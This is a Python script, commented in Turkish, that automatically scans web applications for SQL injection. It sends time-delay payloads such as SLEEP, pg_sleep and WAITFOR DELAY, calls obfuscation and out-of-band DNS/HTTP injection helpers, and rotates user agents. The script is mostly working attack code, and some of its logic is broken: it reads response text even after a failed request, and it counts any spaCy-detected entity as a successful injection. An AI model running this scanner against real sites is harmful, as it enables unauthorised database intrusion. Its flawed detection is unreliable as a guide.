import requests
import logging
import random
import json
from concurrent.futures import ThreadPoolExecutor
from obfuscator import obfuscate_payloads
from oob_tester import dns_oob_injection, http_oob_injection
import spacy
from datetime import datetime

# spaCy modelini yükleyin
nlp = spacy.load("en_core_web_sm")

# Gelişmiş hata yönetimi fonksiyonları
def log_error(message, exception=None):
    if exception:
        logging.error(f"{message}: {exception}")
    else:
        logging.error(message)

def handle_request_error(response, payload):
    if response is None:
        log_error("İstekten yanıt alınamadı", payload)
    elif response.status_code != 200:
        log_error(f"Beklenmeyen HTTP durumu: {response.status_code}", payload)
    elif not response.text:
        log_error("Yanıt metni boş", payload)
    else:
        log_error("Bilinmeyen hata", payload)

def get_response(url, headers, method='GET', data=None):
    """
    Belirtilen yönteme göre HTTP isteği yapar ve yanıtı döner.
    GET ve POST yöntemleri desteklenir.
    """
    try:
        if method == 'GET':
            return requests.get(url, headers=headers, timeout=5)
        elif method == 'POST':
            return requests.post(url, headers=headers, data=data, timeout=5)
    except requests.Timeout as e:
        log_error("İstek zaman aşımına uğradı", e)
    except requests.ConnectionError as e:
        log_error("Bağlantı hatası oluştu", e)
    except requests.RequestException as e:
        log_error("İstek sırasında hata oluştu", e)
    return None

def compare_headers(original_headers, injection_headers):
    """
    Orijinal isteğin header'ları ile injection yapılan isteğin header'larını karşılaştırır.
    Farklılık varsa True döner, yoksa False döner.
    """
    for key in original_headers:
        if key not in injection_headers or original_headers[key] != injection_headers[key]:
            return True
    return False

def analyze_response_content(response_text):
    """
    Yanıt içeriğini analiz eder ve önemli bilgileri çıkartır.
    """
    doc = nlp(response_text)
    entities = [(ent.text, ent.label_) for ent in doc.ents]
    return entities

def check_response(normal_response_content, response, payload, error_messages):
    """
    Gelen yanıt içeriğini normal yanıtla karşılaştırır ve hata mesajlarını kontrol eder.
    Yanıt farklıysa veya hata mesajı içeriyorsa True döner, aksi halde False döner.
    """
    if not response:
        handle_request_error(response, payload)
        return False
    
    # Yanıt içeriği farklı veya hata mesajları içeriyor mu kontrol edilir
    if response.text != normal_response_content or any(error in response.text for error in error_messages):
        log_error(f"SQL Enjeksiyonu başarılı! Payload: {payload}")
        return True

    # Yanıt içeriğini analiz et
    analyzed_entities = analyze_response_content(response.text)
    if analyzed_entities:
        log_error(f"Yanıt içeriği analiz edildi: {analyzed_entities}")
        return True

    # NLP kullanarak hata mesajlarını kontrol edin
    doc = nlp(response.text)
    for ent in doc.ents:
        if ent.text in error_messages:
            log_error(f"Hata mesajı tespit edildi: {ent.text}")
            return True
    
    return False

def time_delay_injection(url, headers, is_post=False, data=None):
    payloads = [
        "1' AND SLEEP(5)-- ",
        "1); SELECT pg_sleep(5)--",
        "'; WAITFOR DELAY '00:00:05'--"
    ]
    for payload in payloads:
        if is_post:
            data['injection'] = payload
            response = requests.post(url, headers=headers, data=data)
        else:
            response = requests.get(f"{url}{payload}", headers=headers)
        if response.elapsed.total_seconds() > 5:
            logging.warning(f"Zaman gecikmesi enjeksiyonu başarılı! Payload: {payload}")
            return True
    return False

def generate_report(results):
    """
    Test sonuçlarını JSON formatında rapor olarak oluşturur ve dosyaya kaydeder.
    """
    report = {
        "test_date": datetime.now().isoformat(),
        "results": results
    }
    with open('sql_injection_report.json', 'w') as report_file:
        json.dump(report, report_file, indent=4)

def test_sql_injection(url, payloads, error_messages, user_agents, is_post=False, data=None):
    """
    SQL enjeksiyon testini yürütür.
    Her bir payload için obfuscation varyasyonları oluşturur ve test eder.
    """
    results = []
    # Kullanıcı ajanları dosyasından rastgele bir user-agent seçilir
    random_user_agent = random.choice(user_agents) if user_agents else "Mozilla/5.0"
    headers = {'User-Agent': random_user_agent}
    
    # Normal isteği yaparak referans yanıt içeriğini alır
    normal_response = get_response(url, headers, method='POST' if is_post else 'GET', data=data)
    if normal_response:
        normal_response_content = normal_response.text
        original_headers = normal_response.request.headers
        logging.info("Normal yanıt referans olarak alındı.")
    else:
        logging.error("Normal yanıt alınamadı, test gerçekleştirilemiyor.")
        return

    # Zaman gecikmesi enjeksiyonunu kontrol edin
    if time_delay_injection(url, headers, is_post, data):
        logging.info(f"Zaman gecikmesi ile SQL enjeksiyonu tespit edildi.")
        results.append({"type": "time_delay", "status": "success"})
    else:
        results.append({"type": "time_delay", "status": "failure"})

    # Out-of-band DNS enjeksiyonunu kontrol edin
    if dns_oob_injection(url, headers, is_post, data):
        logging.info(f"Out-of-band DNS enjeksiyonu tespit edildi.")
        results.append({"type": "dns_oob", "status": "success"})
    else:
        results.append({"type": "dns_oob", "status": "failure"})

    # Out-of-band HTTP enjeksiyonunu kontrol edin
    if http_oob_injection(url, headers, is_post, data):
        logging.info(f"Out-of-band HTTP enjeksiyonu tespit edildi.")
        results.append({"type": "http_oob", "status": "success"})
    else:
        results.append({"type": "http_oob", "status": "failure"})

    # Çoklu iş parçacığı ile test işlemleri
    with ThreadPoolExecutor(max_workers=5) as executor:
        for payload in payloads:
            # Obfuscation ile farklı varyasyonlar oluşturur
            obfuscated_payloads = obfuscate_payloads(payload)

            for obf_payload in obfuscated_payloads:
                # GET isteği için URL'yi oluşturur, POST için veri kısmına ekler
                target_url = f"{url}{obf_payload}" if not is_post else url
                modified_data = data.copy() if data and is_post else None
                if is_post and modified_data is not None:
                    modified_data['injection'] = obf_payload

                # İstek gönderme ve yanıt kontrol etme işlemini iş parçacığına ekler
                future = executor.submit(get_response, target_url, headers, 'POST' if is_post else 'GET', modified_data)
                response = future.result()

                # Yanıt içeriğini ve header'ları karşılaştırır
                if response:
                    header_diff = compare_headers(original_headers, response.request.headers)
                    result = {
                        "payload": obf_payload,
                        "status": "success" if check_response(normal_response_content, response, obf_payload, error_messages) or header_diff else "failure"
                    }
                    results.append(result)
                else:
                    results.append({"payload": obf_payload, "status": "failure"})

                # Yanıtın boş olması durumunu kontrol et
                if not response.text:
                    log_error("Yanıt metni boş", obf_payload)
                    results.append({"payload": obf_payload, "status": "failure"})
                    continue

                # Yanıt büyüklüğünü kontrol et
                if len(response.text) > 10000:  # Örneğin, 10 KB'den büyük yanıtlar
                    log_error("Yanıt metni çok büyük", obf_payload)
                    results.append({"payload": obf_payload, "status": "failure"})
                    continue

                # Yanıt başlıklarını kontrol et
                if 'Content-Length' in response.headers and int(response.headers['Content-Length']) > 10000:
                    log_error("Yanıt başlığı çok büyük", obf_payload)
                    results.append({"payload": obf_payload, "status": "failure"})
                    continue

    generate_report(results)
    logging.info("SQL enjeksiyon testleri tamamlandı ve rapor oluşturuldu.")
